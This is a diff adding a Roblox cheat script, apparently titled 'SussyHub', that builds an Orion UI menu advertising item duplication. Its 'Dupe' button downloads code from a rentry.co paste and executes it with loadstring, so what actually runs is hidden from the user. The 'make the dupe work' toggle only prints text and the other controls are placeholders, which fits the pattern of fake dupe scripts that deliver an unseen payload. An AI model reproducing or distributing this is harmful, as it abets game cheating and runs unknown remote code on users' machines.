@@ -1,0 +1,79 @@
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+local Window = OrionLib:MakeWindow({
+    Name = "SussyHub",
+    HidePremium = false,
+    Introtext = "Dupe",
+    SaveConfig = true,
+    ConfigFolder = "SussyHub"
+})
+
+OrionLib:MakeNotification({
+    Name = "Hey!",
+    Content = "excuetion successfully",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local TutTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = TutTab:AddSection({
+    Name = "Dupe Section"
+})
+
+TutTab:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/cwp9dfqy/raw', true))()
+        print("Script executed!")
+    end    
+})
+
+TutTab:AddToggle({
+    Name = "Tap this to make the dupe work",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Dupe enabled")
+            -- Add your dupe logic here if applicable
+        else
+            print("Dupe disabled")
+        end
+    end    
+})
+
+TutTab:AddColorpicker({
+    Name = "Colorpicker",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(Value)
+        print("Selected color:", Value)
+        -- Add your color picker logic here
+    end	  
+})
+
+-- Add Slider Logic
+local sliderValue = 5  -- Default value
+
+local Slider = TutTab:AddSlider({
+    Name = "Slider",
+    Min = 0,
+    Max = 20,
+    Default = sliderValue,
+    Color = Color3.fromRGB(255, 255, 255),
+    ValueName = "Pet",
+    Callback = function(Value)
+        sliderValue = Value  -- Update sliderValue variable
+        print("Slider value:", sliderValue)
+        -- Add your slider logic here
+        -- Example: Adjust something based on the slider value
+        -- For instance, change the transparency of an object
+        local transparency = sliderValue / 20  -- Normalize to 0-1 range
+        -- Replace the line below with your actual code that adjusts something
+        -- Example: object.Transparency = transparency
+    end    
+})
+
+OrionLib:Init()
